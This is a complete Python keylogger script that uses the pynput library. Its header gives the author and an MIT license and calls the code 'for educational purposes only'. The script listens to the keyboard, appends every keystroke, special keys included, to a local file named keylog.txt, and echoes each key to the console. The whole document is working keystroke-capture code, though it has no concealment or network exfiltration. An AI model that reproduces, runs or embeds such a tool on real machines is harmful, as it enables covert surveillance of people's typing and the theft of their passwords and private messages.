# ======================================================================================================================
# Author : Akshay Sannakki
# Date : 2024-11-07
# Email : akshaysannakki@gmail.com
# License : MIT License
# Description : This Python script implements a simple keylogger using the `pynput` library. 
#               The keylogger captures keystrokes and logs them to a text file, allowing you to monitor keyboard input. 
# ======================================================================================================================
# Disclaimer : For educational purposes only.
# ======================================================================================================================


from pynput import keyboard

def keyPressed(key):
    try:
        # Log alphanumeric characters
        with open("keylog.txt", 'a') as logkey:
            logkey.write(str(key.char))  # `key.char` is the character
    except AttributeError:
        # Log special keys
        with open("keylog.txt", 'a') as logkey:
            logkey.write(f'[{key}]')  # Represent special keys within brackets

    print(f"Key pressed: {key}")  # Display the key in the console (optional)

if __name__ == "__main__":
    # Set up the listener
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  # Keeps the listener running indefinitely
